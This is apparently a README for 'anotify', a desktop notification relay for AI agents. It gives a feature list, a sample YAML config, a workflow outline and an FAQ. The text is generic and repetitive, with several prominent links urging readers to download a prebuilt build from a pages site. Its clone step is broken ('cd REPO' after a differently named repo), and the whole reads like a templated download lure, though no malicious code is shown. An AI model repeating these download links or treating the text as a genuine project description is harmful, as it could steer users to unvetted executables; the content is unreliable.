# anotify v0.2.1 - desktop notification relay for 2026

> **anotify v0.2.1 is a cross-platform desktop notification relay for AI agents and approval-based automation, pairing a self-hosted backend with native desktop notifications.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform%20desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.2.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathan-brooksuruz3264/anotify-desktop-relay?style=flat-square)](https://github.com/nathan-brooksuruz3264/anotify-desktop-relay)

---

<p align="center">
  <a href="https://nathan-brooksuruz3264.github.io/anotify-desktop-relay/">
    <img src="https://img.shields.io/badge/Download-anotify%20Latest-brightgreen?style=for-the-badge" alt="Download anotify">
  </a>
</p>

> **[Download anotify v0.2.1](https://nathan-brooksuruz3264.github.io/anotify-desktop-relay/)**

---

[Download Latest Build](https://nathan-brooksuruz3264.github.io/anotify-desktop-relay/)

---

## What anotify does

anotify gives AI agents, remote processes, and approval-oriented jobs a straightforward way to deliver events to a desktop user. Instead of requiring every workflow to include its own desktop application, anotify provides a shared notification path that works across supported platforms.

Its architecture joins a self-managed relay with a native system tray client. Events can be distributed through WebSocket connections, while token authentication limits access and the inbox keeps earlier notifications and requests available for review.

---

## Capabilities

- Runs across desktop platforms
- Provides a native system tray client
- Shows desktop alerts for real-time events
- Supports approval requests within automated workflows
- Can be deployed through a local or private self-hosted relay
- Broadcasts events over WebSocket
- Uses tokens to authenticate access
- Includes an inbox for viewing notification history

---

## Getting started

Check out the repository and move into its working directory:

```bash
git clone https://github.com/nathan-brooksuruz3264/anotify-desktop-relay.git
cd REPO
```

Use the project files and the platform-specific run command provided by the repository to launch the backend and desktop application. When using a packaged version, download the newest build and open the desktop client directly.

---

## Workflow

The usual notification path is:

1. Launch the self-hosted relay.
2. Attach one or more desktop clients.
3. Have an agent or job runner submit a notification or approval request.
4. View the event from the tray application or history inbox.
5. Provide an approval response when the workflow requires one.

The components communicate along this route:

```text
agent -> relay -> websocket broadcast -> desktop notification
```

Token authentication is available when a team or automation environment needs to restrict which clients may connect and receive notifications.

---

## Settings

Relay and desktop options are defined through the configuration used by your local installation. A typical configuration may contain:

```yaml
relay:
  host: 127.0.0.1
  port: 8000
auth:
  token: your-token-here
desktop:
  inbox_enabled: true
  tray_enabled: true
```

Use the configuration file or environment settings required by the repository layout and the runtime in your deployment. The exact location and format depend on how you run the project.

---

## System requirements

- A cross-platform desktop environment
- Python for the backend components
- Build support for the Tauri desktop client
- WebSocket connectivity between the relay and clients
- Storage for notification history when history is enabled
- A machine capable of hosting the self-managed service

---

## Common questions

**How can I update anotify?**  
Download the latest build from the link above, or pull the newest repository changes if you deploy from source.

**Where are the host and token configured?**  
Review the relay and desktop settings for your installation. Host and token values are normally specified in that configuration.

**Why are desktop notifications not showing up?**  
Verify that the relay is active, the desktop client has connected, and the components can communicate through WebSocket.

**Does anotify require an external hosted service?**  
anotify is designed around a self-hosted relay, so the backend should run in an environment you control.

**How can I review previous notifications?**  
Open the desktop application's history inbox, provided that the inbox feature is enabled.

---

## License

anotify is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
